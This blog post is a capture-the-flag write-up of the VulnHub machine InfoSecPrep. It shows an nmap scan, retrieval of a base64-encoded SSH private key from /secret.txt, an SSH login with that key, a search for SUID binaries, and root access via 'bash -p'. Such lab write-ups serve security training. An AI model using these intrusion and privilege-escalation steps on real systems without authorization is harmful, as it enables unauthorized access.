---
layout: post
title: InfoSecPrep
description: InfoSecPrep is a linux machine in which a ssh private key is disclosed in the web page.
categories: [writeups]
tags: [vulnhub, Cryptographic Failure, SUID]
---

## **Summary**

We found a `base64` encoded SSH private key, which we used to access the machine. The privilege escalation was straightforward because the binary `bash`
had the SUID bit set.

> Machine can be found in [Vulnhub](https://www.vulnhub.com/entry/infosec-prep-oscp,508/)
{: .prompt-info }

## **Enumeration**

### **nmap**

nmap scan revealed that `Apache httpd 2.4.41` is running on port `80`, and robots.txt contains a Disallowed entry: `/secret.txt`

![nmap scan](/assets/infosecprep/nmap_scan.png)

```
$ nmap 192.168.1.102 -sV -sC
Nmap scan report for 192.168.1.102
Host is up (0.00067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-generator: WordPress 5.4.2
|_http-title: OSCP Voucher &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  4 08:16:54 2022 -- 1 IP address (1 host up) scanned in 22.49 seconds
```

### **http**

`secret.txt` conatins a `base64` value

```
$ curl 192.168.1.102/secret.txt -O
```

![curl secret](/assets/infosecprep/curl_secret.png)

After we decoded it, we got a ssh private key.

`cat secret.txt | base64 -d > ssh-key`

![ssh private key](/assets/infosecprep/ssh-key.png)

## **Foothold**

We used the ssh-key to get a session as `oscp` user

> Always make sure the private key has the appropriate permissions `0600`, otherwise it won't work.
{: .prompt-info}

```
$ chmod 0600 ssh-key
$ ssh -i ssh-key oscp@192.168.1.102
```

![oscp user](/assets/infosecprep/oscp_user.png)

## **PrivEsc**

Used `find` command to find files with SUID bit set.

```
$ find / -type f -perm -u=s 2>/dev/null
```

![find suid](/assets/infosecprep/find.png)

The output showed that `/usr/bin/bash` is one of them.

![bash suid](/assets/infosecprep/bash-suid.png)

Ran `bash -p` and got a root shell

![root shell](/assets/infosecprep/root-shell.png)
